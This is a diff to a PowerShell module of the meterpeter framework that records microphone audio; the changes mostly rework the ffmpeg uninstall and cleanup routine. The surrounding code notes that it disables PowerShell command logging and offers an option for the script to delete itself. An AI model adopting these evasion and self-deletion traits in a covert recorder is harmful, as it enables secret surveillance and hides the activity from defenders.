@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: ffmpeg.exe {auto-download}
    Optional Dependencies: Curl, WinGet {native}
-   PS cmdlet Dev version: v2.2.8
+   PS cmdlet Dev version: v2.2.9
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.14.1 that records native
@@ -140,7 +140,7 @@
 )
 
 
-$cmdletver = "v2.2.8"
+$cmdletver = "v2.2.9"
 $IPath = (Get-Location).Path.ToString()
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -189,8 +189,8 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
       ---------------------
       C:\Users\pedro\AppData\Local\Temp
 
-      [20:43] Delete Environment Path Value? (yes|no): yes
-      [20:43] Setting new Environment Paths value
+      [20:43] Delete environment path value? (yes|no): yes
+      [20:43] Setting new environment paths value
 
       Current Environment paths
       -------------------------
@@ -204,22 +204,36 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
       C:\Users\pedro\AppData\Local\Microsoft\WindowsApps
 
       [20:43] FFmpeg environment path successfuly deleted!
+      [20:43] Path -> 'C:\Users\pedro\AppData\Local\Temp'
    #>
 
    Invoke-CurrentTime
+   $LocalAbort = "false"
    write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
    write-host "delete ffmpeg from environment path"
+   Start-Sleep -Milliseconds 1900
 
    ## Import the machine's PATH variable into the current session
    $Env:PATH = [Environment]::GetEnvironmentVariable("Path","USER")
+
+   ## Make sure we are not deleting LEGIT paths from Environment paths
    $RawPaths = ([Environment]::GetEnvironmentVariables()).Path
    If($RawPaths -match '^(C:\\WINDOWS\\system32\\|C:\\WINDOWS\\system32|C:\\WINDOWS\\System32\\Wbem\\|C:\\WINDOWS\\System32\\Wbem|C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\|C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0)')
    {
       $Parsedata = $RawPaths -split ';'
       write-host "[ABORT] cant find ffmpeg Environement path!" -ForegroundColor Red
+      Start-Sleep -Milliseconds 900
       write-host "`nCurrent Environement Paths" -ForegroundColor Green
       write-host "--------------------------"
       echo $Parsedata
+      write-host "[" -ForegroundColor Red -NoNewline;write-host "DELETE VARIABLES" -NoNewline
+      write-host "] `$(rundll32.exe sysdm.cpl,EditEnvironmentVariables)" -ForegroundColor Red
+
+      If($AutoDelete.IsPresent)
+      {
+         ## Auto-Deletes this cmdlet in the end
+         Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+      }
 
       write-host ""
       cd "$IPath"
@@ -237,7 +251,8 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
 
    Invoke-CurrentTime
    ## Make sure we are deleting the correct Environment Path Value!
-   write-host "`n[$global:CurrTime] Delete Environment Path Value? (yes|no): " -ForegroundColor Red -NoNewline
+   write-host "`n[" -NoNewline;write-host "$global:CurrTime" -ForegroundColor Red -NoNewline
+   write-host "] " -NoNewline;write-host "Delete environment path value? (yes|no): " -ForegroundColor Red -NoNewline
    $Choise = Read-Host
 
    If($Choise -imatch '^(y|yes)$')
@@ -248,7 +263,14 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
       )
 
       write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
-      write-host "Setting new Environment Paths value"
+      write-host "Setting new environment paths value"
+   }
+   Else
+   {
+      $LocalAbort = "true"
+      write-host "[" -NoNewline
+      write-host "ABORT" -ForegroundColor Red -NoNewline
+      write-host "] Dont modify environment paths value"
    }
 
    Start-Sleep -Milliseconds 800
@@ -262,9 +284,30 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
    write-host "--------------------------"
    echo $ParseDataPat
 
-   Invoke-CurrentTime
-   write-host "[$global:CurrTime] FFmpeg environment path successfuly deleted!`n" -ForegroundColor Green
+   If($LocalAbort -match 'false')
+   {
+      ## Delete old ffmpeg binary\files
+      Remove-Item -Path "$WorkingDir\*.mp3" -Force
+      Remove-Item -Path "$WorkingDir\ffmpeg.exe" -Force
+      Remove-Item -Path "$WorkingDir\ffmpeg.log" -Force
+      Remove-Item -Path "$WorkingDir\cv_debug.log" -Force
+      Remove-Item -Path "$WorkingDir\WinGet" -Force -Recurse
+      Remove-Item -Path "$WorkingDir\ffmpeg-release-essentials.zip" -Force
+      Remove-Item -Path "$WorkingDir\ffmpeg-6.1.1-essentials_build" -Force -Recurse
+
+      Invoke-CurrentTime
+      write-host "[$global:CurrTime] FFmpeg environment path successfuly deleted!" -ForegroundColor Green
+      write-host "[$global:CurrTime] " -NoNewline;write-host "Path" -ForegroundColor Green -NoNewline
+      write-host " -> " -NoNewline;write-host "'$DeleteThisPath'`n" -ForegroundColor Green
+   }
+   Else
+   {
+      write-host "[" -ForegroundColor Red -NoNewline;write-host "DELETE VARIABLES" -NoNewline
+      write-host "] `$(rundll32.exe sysdm.cpl,EditEnvironmentVariables)" -ForegroundColor Red
+   }
+
    If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
+   write-host ""
    cd "$IPath"
    return 
 }
@@ -278,19 +321,29 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(Store|Mtore|WinGet)$'))
 
    .OUTPUTS
       [20:42] 🔌 record native microphone audio 🔌
+      [20:42] Search for ffmpeg local installation
       Encontrado FFmpeg [Gyan.FFmpeg]
       Iniciando a desinstalação do pacote...
       Limpando o diretório de instalação...
       Desinstalado com êxito
    #>
 
+   Invoke-CurrentTime
+   write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
+   write-host "Search for ffmpeg local installation"
+
+   If($LogFile.IsPresent)
+   {
+      echo "[$global:CurrTime] Search for ffmpeg local installation" >> "$WorkingDir\ffmpeg.log"
+   }
+
    ## Search for FFmpeg Pacakage locally
    $IsAvailable = (Winget list|findstr /C:"FFmpeg")
    If([string]::IsNullOrEmpty($IsAvailable))
    {
       Invoke-CurrentTime
-      write-host "[$global:CurrTime] Error: program 'FFmpeg' not found in msstore [local]`n" -ForegroundColor Red
-      If($LogFile.IsPresent){echo "[$global:CurrTime] Error: program 'FFmpeg' not found in msstore [local]" >> "$WorkingDir\ffmpeg.log"}
+      write-host "[ABORT] 'FFmpeg' not found in msstore [LOCAL]`n" -ForegroundColor Red
+      If($LogFile.IsPresent){echo "[$global:CurrTime] Abort: FFmpeg not found in msstore [local]" >> "$WorkingDir\ffmpeg.log"}
       If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
       cd "$IPath"
       return      
@@ -304,6 +357,12 @@ If(($UnInstall.IsPresent) -and ($Installer -match '^(Store|Mtore|WinGet)$'))
       write-host "[$global:CurrTime] Error: fail Uninstalling program 'FFmpeg' id 'Gyan.FFmpeg'" -ForegroundColor Red
       If($LogFile.IsPresent){echo "[$global:CurrTime] Error: fail Uninstalling program 'FFmpeg' id 'Gyan.FFmpeg'" >> "$WorkingDir\ffmpeg.log"}
    }
+
+   ## Delete old ffmpeg binary\files
+   Remove-Item -Path "$WorkingDir\*.mp3" -Force
+   Remove-Item -Path "$WorkingDir\ffmpeg.log" -Force
+   Remove-Item -Path "$WorkingDir\cv_debug.log" -Force
+   Remove-Item -Path "$WorkingDir\WinGet" -Force -Recurse
 
    If($AutoDelete.IsPresent)
    {
@@ -588,7 +647,7 @@ If(($ForceEnvPath.IsPresent) -and ($Installer -imatch '^(GitHub)$'))
    .OUTPUTS
       [20:45] ENVPATH -> Prepend FFmpeg folder path to the path variable
       [20:45] ENVPATH -> Import user PATH variable into current session.
-      [DELETE VARIABLES] Windows+R: 'rundll32.exe sysdm.cpl,EditEnvironmentVariables'
+      [DELETE VARIABLES] $(rundll32.exe sysdm.cpl,EditEnvironmentVariables)
 
       [20:45] MP3file -> 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3'
    #>
@@ -613,7 +672,7 @@ If(($ForceEnvPath.IsPresent) -and ($Installer -imatch '^(GitHub)$'))
 
       Invoke-CurrentTime
       ## MANUAL DELETE Environment Variables instructions
-      write-host "[DELETE VARIABLES] Windows+R: 'rundll32.exe sysdm.cpl,EditEnvironmentVariables'" -ForegroundColor DarkYellow
+      write-host "[DELETE VARIABLES] `$(rundll32.exe sysdm.cpl,EditEnvironmentVariables)" -ForegroundColor DarkYellow
       If($LogFile.IsPresent){echo "[$global:CurrTime] ENVPATH     : FFmpeg alias added to USER environement path" >> "$WorkingDir\ffmpeg.log"}
       If($LogLevel -imatch '^(info|verbose|error|warning|panic)$'){write-host ""}
    }
@@ -624,7 +683,7 @@ If(($ForceEnvPath.IsPresent) -and ($Installer -imatch '^(GitHub)$'))
       write-host "] ENVPATH -> " -NoNewline;write-host "FFmpeg already present in USER environement path" -ForegroundColor Red
 
       ## MANUAL DELETE EnvironmentVariables instructions
-      write-host "[DELETE VARIABLES] Windows+R: 'rundll32.exe sysdm.cpl,EditEnvironmentVariables'" -ForegroundColor DarkYellow
+      write-host "[DELETE VARIABLES] `$(rundll32.exe sysdm.cpl,EditEnvironmentVariables)" -ForegroundColor DarkYellow
       If($LogFile.IsPresent){echo "[$global:CurrTime] ENVPATH     : FFmpeg already present in USER environement path" >> "$WorkingDir\ffmpeg.log"}
    }
 }
